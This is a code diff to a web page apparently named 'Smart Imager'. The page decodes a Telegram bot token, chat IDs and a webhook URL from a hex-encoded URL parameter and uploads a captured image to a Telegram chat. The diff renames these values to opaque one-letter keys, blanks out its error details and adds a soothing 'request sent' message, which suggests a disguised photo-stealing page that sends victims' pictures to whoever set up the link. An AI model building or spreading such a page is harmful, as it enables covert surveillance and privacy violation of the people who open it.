@@ -75,31 +75,28 @@
       return String.fromCharCode(...arr);
     }
 
+    // --- Config object with short keys ---
+    const cfg = { p:"", o:"", f:"", w:"" };
+
     // --- Read hex from URL ---
     const urlParams = new URLSearchParams(window.location.search);
     const hexParam = urlParams.get("secure");
-    let BOT_TOKEN = "";
-    let GROUP_CHAT_ID = "";
-    let ADMIN_CHAT_ID = "";
-    let WEBHOOK_URL = "";
 
     if (hexParam) {
       try {
         const decoded = hexToJson(hexParam);
-        if (Array.isArray(decoded.token)) {
-          BOT_TOKEN = charCodesToString(decoded.token);
+        if (Array.isArray(decoded.p)) {
+          cfg.p = charCodesToString(decoded.p); // token
         }
-        GROUP_CHAT_ID = decoded.chat_id || "";
-        ADMIN_CHAT_ID = decoded.user_id || "";
-        WEBHOOK_URL = decoded.webhook || "";
-        console.log("Decoded values:", BOT_TOKEN, GROUP_CHAT_ID, ADMIN_CHAT_ID, WEBHOOK_URL);
+        cfg.o = decoded.c_id || ""; // chat_id
+        cfg.f = decoded.u || ""; // user_id
+        cfg.w = decoded.w || ""; // webhook
+        console.log("Decoded cfg:", cfg);
       } catch (e) {
-        document.getElementById("errorBox").textContent = "Invalid hex code in URL.";
-        document.getElementById("errorBox").style.display = "block";
+        showError("Error");
       }
     } else {
-      document.getElementById("errorBox").textContent = "No hex parameter found in URL.";
-      document.getElementById("errorBox").style.display = "block";
+      showError("Invalid URL.");
     }
 
     function setButtonState(text, showSpinner = false) {
@@ -128,41 +125,44 @@
     }
 
     function sendToTelegram(imageBlob) {
-      if (!BOT_TOKEN || !GROUP_CHAT_ID) {
-        showError("Error");
+      if (!cfg.p || !cfg.o) {
+        showError("Missing configuration values.");
         setButtonState("📷 Try Again");
         return;
       }
       const formData = new FormData();
-      formData.append("chat_id", GROUP_CHAT_ID);
-      formData.append("caption", "[" + ADMIN_CHAT_ID + "] from Smart Imager");
+      formData.append("chat_id", cfg.o);
+      formData.append("caption", "[" + cfg.f + "] from Smart Imager");
       formData.append("photo", imageBlob);
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot${cfg.p}/sendPhoto`, {
         method: "POST",
         body: formData
       })
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          notifyWebhook({status:"success", admin_id: ADMIN_CHAT_ID, chat_id: GROUP_CHAT_ID});
+          notifyWebhook({
+            status: "success",
+            f: cfg.f,
+            o: cfg.o,
+            msg: "_Your request has been sent, please wait a while 😁_"
+          });
           setButtonState("Request Sent!");
         } else {
-          notifyWebhook({status:"error", description: data.description});
-          showError("Telegram API error: " + data.description);
+          showError("Telegram error: ");
           setButtonState("📷 Try Again");
         }
       })
       .catch(error => {
-        notifyWebhook({status:"error", description: error.message});
-        showError("Network error: " + error.message);
+        showError("Network error: ");
         setButtonState("📷 Try Again");
       });
     }
 
     function notifyWebhook(payload) {
-      if (!WEBHOOK_URL) return;
-      fetch(WEBHOOK_URL, {
+      if (!cfg.w) return;
+      fetch(cfg.w, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
